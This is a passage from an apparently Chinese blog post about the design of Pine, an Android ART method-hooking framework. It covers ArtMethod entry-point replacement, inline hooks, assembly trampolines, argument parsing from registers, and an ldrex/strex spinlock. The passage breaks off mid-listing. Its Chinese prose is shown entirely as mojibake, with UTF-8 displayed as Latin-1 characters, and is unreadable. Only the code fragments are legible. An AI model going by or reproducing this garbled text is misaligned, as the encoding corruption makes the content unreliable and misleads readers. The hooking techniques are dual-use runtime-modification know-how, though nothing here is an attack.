å¯ä»¥æä¾›ä¸åŸæ–¹æ³•å‚æ•°å’Œè¿”å›å€¼éƒ½ç›¸åŒçš„hookæ–¹æ³•ä¸backupæ–¹æ³•ï¼Œæˆ–è€…å¯¹ç¨³å®šæ€§æœ‰è¾ƒé«˜è¦æ±‚è€Œé€Ÿåº¦æ˜¯å…¶æ¬¡çš„è¯ï¼Œé‚£ä¹ˆæ›´å»ºè®®ä½¿ç”¨æˆç†Ÿçš„SandHookæ¡†æ¶ã€‚åŸºç¡€çŸ¥è¯†åœ¨ä»‹ç»Pineä¹‹å‰ï¼Œå…ˆä»‹ç»ä¸€ä¸‹åŸºç¡€çŸ¥è¯†ã€‚ä¸€ä¸ªæ–¹æ³•/æ„é€ å™¨åœ¨artä¸­è¡¨ç¤ºä¸ºä¸€ä¸ªArtMethodå¯¹è±¡ï¼ŒArtMethodä¿å­˜ç€è¯¥æ–¹æ³•çš„ä¿¡æ¯ç­‰ã€‚ä»¥Android 9.0çš„æºç ä¸ºä¾‹ï¼Œä¸€ä¸ªArtMethodæ˜¯è¿™æ ·çš„ï¼š1234567891011121314151617class ArtMethod FINAL &#123; /** è¯¥æ–¹æ³•çš„æ‰€å±ç±» */ GcRoot&lt;mirror::Class&gt; declaring_class_; /** æ–¹æ³•çš„è®¿é—®æ ‡å¿—ï¼Œæ¯”å¦‚publicï¼Œprivateå°±å­˜å‚¨åœ¨è¿™é‡Œ */ std::atomic&lt;std::uint32_t&gt; access_flags_; // çœç•¥ä¸€äº›æˆå‘˜ struct PtrSizedFields &#123; /** å…¬å…±å­˜å‚¨åŒºåŸŸï¼ŒNativeæ–¹æ³•ä¸ºå¯¹åº”çš„nativeå‡½æ•°ï¼Œénativeæ–¹æ³•åˆ™æ˜¯å…¶ä»–ä¸œè¥¿ï¼ˆæ¯”å¦‚jitè¦ç”¨çš„ProfilingInfoï¼‰ */ void* data_; /** æ–¹æ³•å…¥å£ï¼Œå¦‚æœå·²è¢«ç¼–è¯‘åˆ™ä¸ºç¼–è¯‘åçš„ä»£ç å…¥å£ï¼Œæœªç¼–è¯‘åˆ™ä¸ºè§£é‡Šå™¨å…¥å£ */ void* entry_point_from_quick_compiled_code_; &#125;&#125;ç•¥å»ä¸€äº›ç»†èŠ‚ï¼ŒARTçš„å‡½æ•°è°ƒç”¨è¿‡ç¨‹å…¶å®å¾ˆç®€å•ï¼šcalleræƒ³åŠæ³•æ‹¿åˆ°calleeçš„ArtMethodå¯¹è±¡å°†å‚æ•°æŒ‰ç…§çº¦å®šå­˜åˆ°å¯„å­˜å™¨å’Œæ ˆé‡Œè·³è½¬åˆ°calleeçš„æ–¹æ³•å…¥å£åŸºæœ¬å®ç°Pineæ”¯æŒä¸¤ç§æ–¹æ¡ˆï¼Œä¸€ç§æ˜¯æ›¿æ¢å…¥å£ï¼Œå³ä¿®æ”¹ArtMethodçš„entrypointï¼›å¦ä¸€ç§ç±»ä¼¼äºnativeçš„inline hookï¼Œå³è¦†ç›–æ‰ç›®æ ‡æ–¹æ³•çš„ä»£ç å¼€å§‹å¤„çš„ä¸€æ®µä»£ç ï¼Œç”¨äºå¼¥è¡¥Android 8.0ä»¥ä¸‹ç‰ˆæœ¬å…¥å£æ›¿æ¢å¾ˆæœ‰å¯èƒ½ä¸ç”Ÿæ•ˆçš„é—®é¢˜ã€‚å…¥å£æ›¿æ¢æˆ‘ä»¬çœ‹çœ‹ä¸Šé¢çš„ArtMethodï¼Œå‘ç°äº†ä¸€ä¸ªå¾ˆé‡è¦çš„æˆå‘˜ï¼šentry_point_from_quick_compiled_code_ï¼Œè¿™ä¸ªå˜é‡ä¿å­˜è‡³è¯¥æ–¹æ³•çš„ä»£ç å…¥å£ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥ä¿®æ”¹è¿™ä¸ªå˜é‡ï¼Œä¸å°±å¯ä»¥è¾¾åˆ°hookçš„ç›®çš„äº†å—ï¼Ÿç„¶è€Œäº‹æƒ…å¹¶æ²¡æœ‰è¿™ä¹ˆç®€å•ã€‚ç”¨å…¥å£æ›¿æ¢æ–¹æ¡ˆå»hookè‡ªå·±çš„æ–¹æ³•ï¼Œå¤§éƒ¨åˆ†æƒ…å†µä¸‹æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼›ä½†å¦‚æœä½ éœ€è¦hookç³»ç»Ÿçš„æ–¹æ³•ï¼Œå¹¶ä¸”è¿™ä¸ªæ–¹æ³•ä¸æ˜¯virtualæ–¹æ³•ï¼ˆæ¯”å¦‚TextView.setText(CharSequence)ï¼‰ï¼Œé‚£ä¹ˆå¾ˆæœ‰å¯èƒ½ä¸ç”Ÿæ•ˆã€‚è¿™æ˜¯å› ä¸ºï¼ŒAndroid 8.0ä»¥ä¸‹ï¼Œartæœ‰ä¸€ä¸ªSharpeningä¼˜åŒ–ï¼Œå¦‚æœartèƒ½å¤Ÿç¡®å®šcalleeçš„ä»£ç å…¥å£ï¼Œé‚£ä¹ˆæœ‰å¯èƒ½ç›´æ¥æŠŠå…¥å£ç¡¬ç¼–ç åœ¨æœºå™¨ç å†…ï¼Œæ ¹æœ¬ä¸ä¼šå»ArtMethodé‡Œå–å…¥å£ã€‚è¿˜æœ‰æ²¡æœ‰å…¶ä»–æ–¹æ³•å‘¢ï¼Ÿå½“ç„¶æœ‰ï¼Œé‚£å°±æ˜¯inline hookã€‚inline hookä»ä¸Šé¢çš„åˆ†æå¯ä»¥çœ‹å‡ºï¼Œç›®æ ‡æ–¹æ³•çš„ä»£ç æ˜¯ä¸€å®šä¼šç”¨åˆ°çš„ï¼›é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥ä¿®æ”¹ç›®æ ‡æ–¹æ³•çš„ä»£ç ï¼ŒæŠŠå‰å‡ æ¡ä»£ç ä¿®æ”¹ä¸ºä¸€æ®µè·³è½¬æŒ‡ä»¤ï¼Œè¿™æ ·å½“è¿™ä¸ªæ–¹æ³•æ‰§è¡Œæ—¶ï¼Œå°±ä¼šç›´æ¥è·³åˆ°æˆ‘ä»¬æŒ‡å®šçš„å¦ä¸€æ®µä»£ç å¤„æ‰§è¡Œï¼Œæˆ‘ä»¬å°±è¾¾åˆ°äº†hookç›®çš„ã€‚ä»¥ä¸‹æƒ…å†µä¸èƒ½è¢«inline hookï¼šjniæ–¹æ³•å’Œä»£ç†æ–¹æ³•ã€‚jniæ–¹æ³•å’Œä»£ç†æ–¹æ³•éƒ½æ²¡æœ‰å¯¹åº”çš„å·²ç¼–è¯‘ä»£ç ï¼Œå…¶entry_point_from_quick_compiled_code_å›ºå®šæŒ‡å‘ä¸€æ®µtrampolineï¼Œè¿™ä¸ªtrampolineä¼šè·³è½¬åˆ°çœŸæ­£çš„ä»£ç å¤„æ‰§è¡Œã€‚æ–¹æ³•æœªè¢«ç¼–è¯‘ä¸”å°è¯•ç¼–è¯‘å¤±è´¥ã€‚æ–¹æ³•å·²è¢«ç¼–è¯‘ï¼Œä½†ä»£ç å¤ªçŸ­ä»¥è‡³äºä¸€ä¸ªç®€å•çš„è·³è½¬æŒ‡ä»¤éƒ½æ”¾ä¸ä¸‹ã€‚è·³è½¬æŒ‡ä»¤arm32éœ€è¦8å­—èŠ‚ï¼Œarm64éœ€è¦16å­—èŠ‚ï¼›å®é™…ä¸Šæˆ‘ä»¬å¯ä»¥è€ƒè™‘å…¶ä»–æ–¹å¼è·³è½¬ï¼Œæ¯”å¦‚å¦‚æœæˆ‘ä»¬å¯ä»¥å·åˆ°ç›®æ ‡ä»£ç é™„è¿‘çš„å†…å­˜ï¼Œå°±èƒ½ç›´æ¥ä½¿ç”¨bæŒ‡ä»¤è·³è½¬ï¼ˆæ­¤æ–¹æ³•æ¥è‡ªäºDobbyæ¡†æ¶ï¼‰ï¼›æˆ–è€…æˆ‘ä»¬å¯ä»¥æ”¾ä¸€ä¸ªéæ³•æŒ‡ä»¤ï¼Œç¨‹åºæ‰§è¡Œåˆ°è¿™æ¡æŒ‡ä»¤æ—¶ä¼šäº§ç”Ÿä¸€ä¸ªSIGILLä¿¡å·ï¼Œæˆ‘ä»¬æ•è·åˆ°è¿™ä¸ªä¿¡å·ï¼Œå¯¹å¯„å­˜å™¨å’Œæ ˆè¿›è¡Œæ“ä½œå°±èƒ½ç›´æ¥æ§åˆ¶æ‰§è¡Œæµç¨‹ï¼ˆæ³¨ï¼šæ­¤æ–¹æ³•æ¥è‡ªäºå“æ¡å¤§ä½¬çš„Android elf hookçš„æ–¹å¼ï¼‰ã€‚ä¹‹æ‰€ä»¥ä¸åšè¿™ä¸ªå¤„ç†ï¼Œæ˜¯å› ä¸ºè¿™æ ·çš„æ–¹æ³•å¾ˆå°‘ï¼Œè€Œä¸”å¾ˆå¯èƒ½è¢«ç›´æ¥å†…è”åˆ°calleré‡Œï¼Œä¸ªäººè®¤ä¸ºæ²¡å¿…è¦ã€‚æ–¹æ³•çš„å‰å‡ æ¡ä»£ç é‡Œæœ‰pcå¯„å­˜å™¨ç›¸å…³æŒ‡ä»¤ï¼Œhookæ—¶æ²¡é—®é¢˜ï¼Œä½†æ‰§è¡ŒåŸæ–¹æ³•æ—¶ä¼šæœ‰é—®é¢˜ï¼ˆå…·ä½“è§åé¢çš„ ä¸€äº›é—®é¢˜-æ‰§è¡ŒåŸæ–¹æ³• éƒ¨åˆ†ï¼‰å½“å‡ºç°ä»¥ä¸Šæƒ…å†µæ—¶ï¼Œè‡ªåŠ¨è½¬ç”¨å…¥å£æ›¿æ¢æ¨¡å¼ã€‚å››ä¸ªè·³æ¿æˆ‘ä»¬éœ€è¦å†™å››æ®µæ¨¡æ¿ä»£ç ï¼Œæ³¨æ„è¦ç”¨çº¯æ±‡ç¼–å†™ä»¥é¿å…ç ´åæ ˆå’Œå¯„å­˜å™¨ï¼Œæš‚æ—¶å‘½åä¸ºtrampolineï¼šDirectJumpTrampolineï¼šinline hookä½¿ç”¨ï¼ŒåŠŸèƒ½æ˜¯è·³è½¬è‡³ä¸€ä¸ªç»å¯¹åœ°å€ï¼Œéœ€è¦æ’å…¥ç›®æ ‡æ–¹æ³•çš„ä»£ç å¼€å§‹å¤„ã€‚BridgeJumpTrampolineï¼šä¸¤ä¸ªæ–¹æ¡ˆéƒ½éœ€è¦ä½¿ç”¨ï¼Œå¤„ç†ä¸€äº›ä¸œè¥¿å¹¶è·³è½¬è‡³Bridgeæ–¹æ³•ï¼Œè¿™ä¸ªbridgeæ˜¯æˆ‘ä»¬é¢„å…ˆå†™å¥½çš„ä¸€ä¸ªjavaæ–¹æ³•ï¼Œè·³è½¬åˆ°è¿™ä¸ªæ–¹æ³•ä¹‹åæˆ‘ä»¬å°±å›åˆ°äº†javaä¸–ç•Œï¼Œç„¶åå°±å¯ä»¥å¼€å§‹å¤„ç†çœŸå®çš„AOPé€»è¾‘ã€‚CallOriginTrampolineï¼šå…¥å£æ›¿æ¢ä½¿ç”¨ï¼ŒåŠŸèƒ½æ˜¯è®¾ç½®r0å¯„å­˜å™¨ä¸ºåŸæ–¹æ³•å¹¶è·³è½¬è‡³åŸæ–¹æ³•å…¥å£ã€‚å°†æˆä¸ºbackupæ–¹æ³•çš„å…¥å£ã€‚ï¼ˆæš‚æœªä½¿ç”¨ï¼Œç›®å‰å‘ç°è®¾ç½®r0å¯„å­˜å™¨ä¸ºåŸæ–¹æ³•åæœ‰å‡ ç‡é€ æˆå¡æ­»ï¼‰BackupTrampolineï¼šinline hookä½¿ç”¨ï¼Œè®¾ç½®r0å¯„å­˜å™¨ä¸ºåŸæ–¹æ³•ã€å­˜æ”¾è¢«è¦†ç›–çš„ä»£ç å¹¶è·³è½¬è‡³(åŸæ–¹æ³•å…¥å£+å¤‡ä»½ä»£ç å¤§å°)å¤„ç»§ç»­æ‰§è¡Œã€‚å°†æˆä¸ºbackupæ–¹æ³•çš„å…¥å£ã€‚ï¼ˆå…¶å®è¿™æ®µä»£ç å«trampolineæ˜¯ä¸å¤ªåˆé€‚çš„ï¼‰ä¸€äº›é—®é¢˜åŸºæœ¬åŸç†æ¯”è¾ƒç®€å•ï¼Œä½†æ˜¯å®ç°çš„è¿‡ç¨‹ä¸­ä¼šé‡åˆ°å¾ˆå¤šçš„é—®é¢˜ï¼Œè¿™é‡Œç®€å•è¯´ä¸€ä¸‹ã€‚å‚æ•°è§£æå¤§æ¦‚æƒ³äº†ä¸€ä¸‹ï¼Œå‚æ•°è§£ææœ‰ä»¥ä¸‹æ–¹æ¡ˆï¼šåŠ¨æ€ç”Ÿæˆå‡ºä¸€ä¸ªæœ‰å’ŒåŸæ–¹æ³•ç›¸åŒçš„å‚æ•°åˆ—è¡¨çš„æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•åªæ˜¯ä¸€ä¸ªbridgeï¼Œä½œç”¨å°±æ˜¯ä¼ é€’å‚æ•°å’Œè¿”å›å€¼ï¼›éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªæ–¹æ³•å¿…é¡»è¦æœ‰å¯¹åº”çš„ä»£ç ï¼Œå’Œä¸€äº›å¿…è¦çš„æˆå‘˜ï¼Œä¸ºæ­¤å¯ä»¥æœ‰ä¸¤ç§æ–¹æ³•ï¼šé€šè¿‡å¦‚DexMakerç­‰åŠ¨æ€å­—èŠ‚ç ç”ŸæˆæŠ€æœ¯åŠ¨æ€ç”Ÿæˆå‡ºè¿™ä¸ªæ–¹æ³•ï¼ˆEdXposedç”¨çš„æ–¹æ¡ˆï¼‰ï¼›è¿™ç§æ–¹æ¡ˆçš„ä¸»è¦é—®é¢˜æ˜¯æ¯”è¾ƒæ…¢ï¼ŒåŠ¨æ€ç”Ÿæˆdexå¹¶åŠ è½½æ˜¯è€—æ—¶æ“ä½œã€‚åˆ©ç”¨javaçš„åŠ¨æ€ä»£ç†åŠ¨æ€ç”Ÿæˆï¼Œéš¾ç‚¹åœ¨äºå¦‚ä½•æ§åˆ¶è¿™ä¸ªæ–°ç”Ÿæˆçš„ä»£ç†æ–¹æ³•åšä½ æƒ³è¦åšçš„äº‹ï¼›SandHookçš„xposedcompat_newé‡Œå®ç°äº†ä¸€ä¸ªï¼šæŠŠè¿™ä¸ªä»£ç†æ–¹æ³•è®¾ç½®ä¸ºnativeæ–¹æ³•ï¼Œç„¶åé€šè¿‡libffiåŠ¨æ€ç”Ÿæˆå¯¹åº”çš„nativeå‡½æ•°ï¼Œç„¶åä¿®æ”¹å…¶entry_point_from_jniï¼ˆå…¶å®å°±æ˜¯Whaleé‚£ä¸ªæ–¹æ¡ˆï¼Œä¸è¿‡whaleæ˜¯å¯¹ç›®æ ‡æ–¹æ³•ï¼ŒSandHookçš„xposedcompat_newæ˜¯å¯¹å¤„ç†æ–¹æ³•ï¼‰ï¼Œè¿™ä¸ªæ–¹æ¡ˆæœ‰ç‚¹é—®é¢˜ï¼Œå‡­ç©ºæŠŠä¸€ä¸ªénativeæ–¹æ³•å˜ä¸ºnativeæœ‰å¾ˆå¤šæœªçŸ¥çš„å‘ç­‰ç€ä½ å»è¸©ã€‚ç»Ÿä¸€bridgeæ–¹æ³•ï¼Œåœ¨è¿™ä¸ªbridgeæ–¹æ³•é‡Œè‡ªå·±è§£æå‚æ•°ã€‚artä¸ºäº†å®ç°javaçš„åŠ¨æ€ä»£ç†ï¼Œè‡ªå·±å°±æœ‰ä¸€ä¸ªart_quick_proxy_invoke_handlerï¼Œå¦‚æœèƒ½åˆ©ç”¨å¥½è¿™ä¸ªå†…ç½®å‡½æ•°ï¼Œé‚£ä¹ˆå°±å¯ä»¥è¾¾åˆ°ç›®çš„ã€‚ä¸è¿‡çœ‹äº†ä¸‹ä»£ç ï¼Œè¿™ä¸ªå‡½æ•°åˆ©ç”¨èµ·æ¥å¾ˆéš¾ï¼Œæš‚æ—¶å…ˆæ”¾å¼ƒã€‚æœ€ç»ˆæˆ‘é€‰æ‹©è‡ªå·±è§£æå‚æ•°ï¼Œhookæ—¶è¾ƒå¿«ï¼›ä¸ºæ­¤æˆ‘ä»¬éœ€è¦äº†è§£ARTçš„å‡½æ•°è°ƒç”¨çº¦å®šï¼Œæ ¹æ®è¿™ä¸ªçº¦å®šå»è§£æã€‚ä»¥arm32/thumb2ä¸ºä¾‹ï¼Œåœ¨ARTä¸­ï¼Œr0å¯„å­˜å™¨å›ºå®šä¿å­˜calleeçš„ArtMethod*ï¼Œr1~r3å¯„å­˜å™¨ä¿å­˜å‰ä¸‰ä¸ªå‚æ•°ï¼ˆæ³¨ï¼šéé™æ€æ–¹æ³•å®é™…ä¸Šç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯thisï¼‰ï¼›åŒæ—¶ï¼Œsp~sp+12ä¸Šä¹Ÿä¼ é€’ç€r0~r3ä¸Šçš„å€¼ï¼›å¤šä½™çš„å‚æ•°é€šè¿‡æ ˆä¼ é€’ï¼Œæ¯”å¦‚ç¬¬å››ä¸ªå‚æ•°å°±å­˜åœ¨sp+16ä¸Šï¼›å¦‚æœä¸€ä¸ªå‚æ•°ä¸€ä¸ªå¯„å­˜å™¨æ”¾ä¸ä¸‹ï¼ˆlong/doubleï¼‰ï¼Œé‚£ä¹ˆä¼šå ç”¨ä¸¤ä¸ªå¯„å­˜å™¨ã€‚ä¸è¿‡è¿™åªæ˜¯åŸºæœ¬æƒ…å†µï¼Œå…¶ä»–æƒ…å†µè¿˜éœ€ç‰¹åˆ«å¤„ç†ï¼ˆå¦‚åœ¨6.0æˆ–ä»¥ä¸Šï¼Œå¦‚æœç¬¬ä¸€ä¸ªå‚æ•°æ˜¯long/doubleç±»å‹çš„ï¼Œé‚£ä¹ˆä¼šè·³è¿‡r1å¯„å­˜å™¨ç­‰ç­‰ï¼‰ã€‚okï¼Œæˆ‘ä»¬å‘ç°äº†ä¸€ä¸ªç®€å•çš„åŠæ³•ï¼šæˆ‘ä»¬å¯ä»¥ä¿®æ”¹r1~r3ä¼ é€’å…¶ä»–ä¸œè¥¿ï¼Œå¿…é¡»éœ€è¦çš„åªæœ‰spï¼Œå› ä¸ºsp~sp+12ä¸Šä¹Ÿå­˜æ”¾ç€r0~r3ä¸Šçš„å€¼ï¼Œå‰©ä¸‹çš„å‚æ•°ä¹Ÿé€šè¿‡spä¼ é€’ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥é€šè¿‡spå°±èƒ½è·å–åˆ°æ‰€æœ‰å‚æ•°ï¼Ÿå…´å†²å†²çš„å†™å¥½ä»£ç æµ‹è¯•å‘ç°ï¼Œæ­¤è·¯ä¸é€šï¼Œé€šè¿‡spæ‹¿åˆ°çš„å‰å‡ ä¸ªå‚æ•°æ˜¯ä¹±çš„ã€‚ä¸ºä»€ä¹ˆï¼Ÿweishuçš„æ–‡ç« è®ºARTä¸Šè¿è¡Œæ—¶ Method AOPå®ç°é‡Œæ­éœ²äº†ç­”æ¡ˆï¼šè™šæ‹Ÿæœºæœ¬èº«ä¹Ÿæ˜¯çŸ¥é“ sp + 12 è¿™æ®µç©ºé—´ç›¸å½“äºæ˜¯æµªè´¹çš„ï¼Œå› æ­¤ä»–ç›´æ¥æŠŠè¿™æ®µç©ºé—´å½“åšç±»ä¼¼å¯„å­˜å™¨ä½¿ç”¨äº†ã€‚é‚£æ€ä¹ˆåŠå‘¢ï¼Ÿåœ¨æ ˆä¸Šåˆ†é…å†…å­˜æ¥æ”¾ï¼ŸåŒæ ·è¡Œä¸é€šï¼Œè¿™æ ·ä¸€æ—¦å‘ç”Ÿæ ˆå›æº¯ï¼Œspè¢«ä¿®æ”¹çš„é‚£ä¸€å¸§ä¼šå› ä¸ºå›æº¯ä¸åˆ°å¯¹åº”çš„å‡½æ•°å¼•å‘è‡´å‘½é”™è¯¯ï¼Œå¯¼è‡´runtime abortã€‚ç°åœ¨æˆ‘é‡‡ç”¨å’Œepicç±»ä¼¼çš„æ–¹æ³•å®ç°ï¼šåœ¨hookæ—¶åˆ†é…ä¸€æ®µå†…å­˜ï¼Œè¿™æ®µå†…å­˜ç”¨æ¥æ”¾r0~r3ï¼Œå…ˆä¿å­˜äº†å†è·³è½¬åˆ°bridgeæ–¹æ³•ï¼Œbridgeæ–¹æ³•å°±å¯ä»¥å–å‡ºå¯¹åº”çš„å€¼ã€‚å¦å¤–å¯¹è±¡ç±»å‹è¦ç‰¹åˆ«å¤„ç†ï¼Œartä¼ é€’å¯¹è±¡æ—¶å…¶å®ä¼ çš„æ˜¯è¿™ä¸ªå¯¹è±¡çš„åœ°å€ï¼Œæˆ‘ä»¬æ¥æ”¶åˆ°çš„åªæ˜¯ä¸€ä¸²æ•°å­—ï¼Œè½¬æ¢çš„æ–¹æ³•æœ‰ä¸¤ä¸ªï¼šç›´æ¥é€šè¿‡javaå±‚çš„Unsafeï¼Œç›´æ¥putè¿›åœ°å€ï¼Œæ‹¿å‡ºæ¥çš„å°±æ˜¯å¯¹è±¡é€šè¿‡jniï¼Œç”¨ä¸€ä¸ªartå†…éƒ¨å‡½æ•°æŠŠåœ°å€è½¬æ¢æˆjobjectï¼Œè¿”å›åˆ°javaçš„æ—¶å€™ä¼šè‡ªåŠ¨è¿›è¡Œè½¬æ¢è¿™é‡Œæˆ‘é€‰æ‹©ç¬¬äºŒç§æ–¹æ³•ï¼Œå› ä¸ºç¬¬ä¸€ç§éœ€è¦ç”¨åå°„è°ƒç”¨Unsafeï¼Œè€Œåå°„æ•ˆç‡ä¸æ˜¯å¾ˆé«˜ï¼Œæœ‰è¾ƒå¤šå‚æ•°æ—¶æ•ˆç‡ä¼šæ¯”è¾ƒä½ã€‚å¤šçº¿ç¨‹å¹¶å‘ä¸Šé¢æåˆ°ç”±äºæ²¡æœ‰å…¶ä»–åœ°æ–¹æ”¾å‰å‡ ä¸ªå‚æ•°ï¼Œæ‰€ä»¥åœ¨hookæ—¶å°±ä¼šæå‰åˆ†é…ä¸€å—åœ°å€ä¸“é—¨æ¥æ”¾ï¼Œå¤§æ¦‚è¿™æ ·ï¼š1234ldr ip, extra_addrstr r1, [ip, #0]str r2, [ip, #4]str r3, [ip, #8]ç„¶åä¼šåœ¨bridgeé‡Œæ‹¿åˆ°r1~r3ã€‚è¿™æ®µä»£ç åœ¨å•çº¿ç¨‹ä¸‹æ‰§è¡Œå¹¶æ²¡æœ‰é—®é¢˜ï¼Œä½†åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹ï¼Œå¦‚æœå­˜å€¼ä¹‹åè¿˜æ²¡æ¥å¾—åŠå–å€¼å°±è¢«å…¶ä»–çº¿ç¨‹ä¿®æ”¹ï¼Œå°±ä¼šè¯»åˆ°é”™è¯¯çš„å€¼ï¼Œå¯¼è‡´é”™è¯¯ã€‚ä¿®å¤è¿™ä¸ªé—®é¢˜çš„ä¸€ç§æ–¹æ³•æ˜¯ç¦æ­¢å¤šçº¿ç¨‹å¹¶å‘æ‰§è¡Œï¼Œæ¯”å¦‚ç»™ç›®æ ‡æ–¹æ³•åŠ ä¸Šsynchronizedçš„flagï¼Œä½†æ˜¯è¿™æ ·æ˜¾ç„¶å¤ªé‡äº†ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨å­˜å€¼â€”â€”å–å€¼è¿™æ®µæ—¶é—´é‡Œç¦æ­¢å¹¶å‘å³å¯ã€‚ä¸ºæ­¤ï¼Œæˆ‘é€šè¿‡CASæœºåˆ¶å†™äº†ä¸€ä¸ªè‡ªæ—‹é”ï¼š123456789acquire_lock:ldrex r0, [ip]cmp r0, #0wfene // other thread holding the lock, wait it release lockmov r0, #1strexeq r0, r0, [ip]cmpeq r0, #0 // store succeeded?bne acquire_lock // acquire lock failed, try againdmbextrasçš„ç¬¬ä¸€ä¸ªå˜é‡å³ä¸ºé”æ ‡å¿—ï¼Œä¸º0ä»£è¡¨æ— é”ï¼Œä¸º1ä»£è¡¨å·²æœ‰çº¿ç¨‹æŒæœ‰è¯¥é”ï¼Œè·å–æ—¶é€šè¿‡CASå»æŠ¢é”ï¼Œbridgeé‡Œå°†é”æ ‡å¿—ç½®0é‡Šæ”¾é”ã€‚æ³¨æ„éœ€è¦æ·»åŠ å†…å­˜å±éšœä»¥é˜»æ­¢éƒ¨åˆ†å…³é”®æŒ‡ä»¤è¢«ä¹±åºæ‰§è¡Œå¼•å‘é”™è¯¯ã€‚è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼šarm32/thumb2ä¸‹ï¼Œldrex/strexéœ€è¦ä¸€ä¸ªå¯„å­˜å™¨æ¥æ¥æ”¶ç»“æœï¼Œè€Œipå¯„å­˜å™¨å·²å­˜æ”¾ç€extrasçš„åœ°å€ï¼›arm64ä¸‹stlxrè¦æ±‚sourceå’Œstatusä¸èƒ½ç›¸åŒç­‰ç­‰ï¼Œéƒ½éœ€è¦å ç”¨ä¸€ä¸ªé¢å¤–å¯„å­˜å™¨ï¼Œè¿™é‡Œæˆ‘é€‰æ‹©r0å¯„å­˜å™¨ï¼ŒåŸå› å¾ˆç®€å•ï¼šr0å¯„å­˜å™¨å›ºå®šä¿å­˜calleeçš„ArtMethodæŒ‡é’ˆï¼Œè¿™ä¸ªå€¼åœ¨hookçš„æ—¶å€™å°±å·²ç¡®å®šï¼›è·³è½¬åˆ°bridgeæ–¹æ³•æ—¶ä¹Ÿä¼šæ›´æ”¹ä¸ºbridgeçš„ArtMethodç­‰ã€‚ï¼ˆæ³¨ï¼šå‘ç°arm64æœ‰ä¸€ä¸ªxzr/wzrå¯„å­˜å™¨å›ºå®šä¸º0ï¼Œå¦‚æœæŠŠlock_flagæ”¹æˆ0ä¸ºæœ‰é”1ä¸ºæ— é”å°±å¯ä»¥ç›´æ¥ç”¨wzrå¯„å­˜å™¨äº†ï¼Œå¯ä»¥å°‘ç”¨ä¸€ä¸ªå¯„å­˜å™¨ï¼Œåˆ—å…¥TODOåˆ—è¡¨é‡Œäº†ï¼‰ï¼ˆæ³¨2ï¼šä»”ç»†æ€è€ƒäº†ä¸€ä¸‹ï¼Œå‘ç°å¦‚æœä¸¤ä¸ªçº¿ç¨‹æŠ¢é”ï¼ŒæŒæœ‰é”çš„çº¿ç¨‹è·å–åˆ°é”ä»¥åè¿˜æ²¡æ¥å¾—åŠé‡Šæ”¾å°±å› ä¸ºgcç­‰è¿›å…¥checkpointè¢«æŒ‚èµ·ï¼Œè€Œå¦ä¸€ä¸ªçº¿ç¨‹åœ¨ç­‰é”æ— æ³•è¿›å…¥checkpointï¼Œå¯¼è‡´ç±»ä¼¼æ­»é”çš„æƒ…å†µï¼Œæœ€ç»ˆå¯¼è‡´æŒ‚èµ·æ‰€æœ‰çº¿ç¨‹è¶…æ—¶runtime abortï¼Œæ²¡æƒ³åˆ°æ€ä¹ˆè§£å†³ï¼Œæš‚æ—¶å…ˆæŒ‚ç€å§ï¼‰æ‰§è¡ŒåŸæ–¹æ³•è¦æ‰§è¡ŒåŸæ–¹æ³•ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªåŸæ–¹æ³•ä»£ç å…¥å£ã€‚å…¥å£æ›¿æ¢æ¨¡å¼ä¸‹ï¼Œç›´æ¥ä½¿ç”¨åŸæ¥é‚£ä¸ªå…¥å£å°±è¡Œï¼›ä½†åœ¨inline hookæ¨¡å¼ä¸‹ï¼Œç”±äºæˆ‘ä»¬ä¿®æ”¹äº†æ–¹æ³•å…¥å£å¤„çš„ä»£ç ï¼Œéœ€è¦å¯¹åŸæ–¹æ³•ä»£ç è¿›è¡Œå¤‡ä»½ï¼Œè°ƒç”¨åŸæ–¹æ³•çš„æ—¶å€™ç›´æ¥æ‰§è¡Œè¿™æ®µå¤‡ä»½çš„ä»£ç ï¼Œç„¶åç»§ç»­è·³è½¬åˆ°å‰©ä½™ä»£ç éƒ¨åˆ†æ‰§è¡Œå³å¯ã€‚æˆ‘ä»¬ç‰¹åˆ«å†™äº†ä¸€æ®µå«åšBackupTrampolineçš„ä»£ç å®ç°ï¼Œä»¥arm32ä¸ºä¾‹ï¼š12345678910FUNCTION(pine_backup_trampoline)ldr r0, pine_backup_trampoline_origin_method // å°†r0å¯„å­˜å™¨è®¾ç½®ä¸ºåŸæ–¹æ³•VAR(pine_backup_trampoline_override_space).long 0 // ä¼šè¢«æ›¿æ¢ä¸ºçœŸå®ä»£ç .long 0 // ä¼šè¢«æ›¿æ¢ä¸ºçœŸå®ä»£ç ldr pc, pine_backup_trampoline_remaining_code_entry // è·³è½¬åˆ°å‰©ä½™éƒ¨åˆ†ç»§ç»­æ‰§è¡ŒVAR(pine_backup_trampoline_origin_method).long 0VAR(pine_backup_trampoline_remaining_code_entry).long 0è€Œthumb2éœ€è¦ç‰¹åˆ«æ³¨æ„ï¼Œç”±äºåœ¨thumb2ä¸‹ä¸€æ¡æŒ‡ä»¤å¯èƒ½æ˜¯4å­—èŠ‚ä¹Ÿå¯èƒ½æ˜¯2å­—èŠ‚ï¼Œå¦‚æœæˆ‘ä»¬å›ºå®šä¸ºåªå¤‡ä»½8å­—èŠ‚åˆ™æœ‰å¯èƒ½å¯¼è‡´æŒ‡ä»¤è¢«æˆªæ–­ï¼ˆæ¯”å¦‚4-2-4ï¼‰ï¼Œæ‰€ä»¥å¤‡ä»½çš„æ—¶å€™ä¸€å®šè¦æ³¨æ„æŒ‡ä»¤å®Œæ•´æ€§ã€‚123static inline bool IsThumb32(uint16_t inst) &#123; return ((inst &amp; 0xF000) == 0xF000) || ((inst &amp; 0xF800) == 0xE800);&#125;1234567891011FUNCTION(pine_thumb_backup_trampoline)ldr r0, pine_thumb_backup_trampoline_origin_methodVAR(pine_thumb_backup_trampoline_override_space).long 0 // ä¼šè¢«æ›¿æ¢ä¸ºçœŸå®ä»£ç .long 0 // ä¼šè¢«æ›¿æ¢ä¸ºçœŸå®ä»£ç nop // 